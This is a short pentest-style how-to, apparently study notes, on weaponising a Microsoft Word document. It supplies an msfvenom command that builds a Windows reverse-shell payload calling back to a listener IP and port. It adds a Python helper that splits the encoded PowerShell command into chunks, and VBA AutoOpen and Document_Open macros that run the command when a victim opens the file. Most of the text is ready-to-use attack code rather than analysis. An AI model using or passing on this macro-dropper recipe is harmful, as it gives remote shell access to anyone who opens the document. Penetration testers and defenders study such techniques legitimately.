## Malicious Files

### Microsoft Word Macros

The can include Visual Basic for Applications with full access to ActiveX objects and Windows Script Host.

##### Create Payload

1. Use msfvenom to construct the payload using the hta format, but think of what the target will be connecting back to, if using laterally

   ```powershell
   msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.216 LPORT=8000 -f hta-psh -o badfile.hta
   ```

2. Open the output file and copy from `"powershell.exe....` to the quote at the end of the encoded payload (not including the `,0` at the end)

3. To generate reverse shell code to insert into a macro, we must split up the command into multiple lines and concatenate them because VBA has a 255 character limit for literal strings, but that limit does not apply to strings stored in variables.

   ```python
   # Python script to split up command
   str = "COMMAND GOES HERE"  # you should only have on set of quotes around your command
   n = 50
   for i in range(0, len(str), n):
   	print "Str = Str + " + '"' + str[i:i+n] + '"'
   ```

4. You can run this command and send the output to the clipboard with xclip

   ```bash
   python ./code-split.py | xclip -selection clipboard
   ```


#### Create macro

1. In Word, select 'View' -> 'Macros'

2. Enter 'MyMacro' for the name and select the current document for 'Macros in:'

3. Create the following procedures

   - Create procedures for AutoOpen and Document_Open to cause the macro to run when the document is opened for the first time or re-opened while already open.  
   - Create a procedure with the exploit code in it and call it from the Open procedures above.  The split code Python generate can then be inserted into the Macro in Word to avoid the 255 character limit.

   ```vbscript
   ' Auto-run procedures
   Sub AutoOpen()
   MyMacro
   End Sub
   
   Sub Document_Open()
   MyMacro
   End Sub
   
   ' Procedure to run reverse shell code
   Sub MyMacro()
   	Dim Str as String
       '<INSERT STRING BUILDER OUTPUT FROM PYTHON>'
       CreateObject("Wscript.shell").Run Str
   End Sub
   ```

4. Be sure to save the containing document as .doc or .docm which support embedded macros, but NOT .docx (this may show as 'Word 97-2003 Document').

5. MAKE SURE YOU FTP TRANSFER IN BINARY MODE!

#### Verify Payload

After transferring the file to Kali, you can verify the payload is intact with olevba

```bash
olevba FILENAME.DOC
```

This will show if it has any VBA scripts in it and what they pertain to.
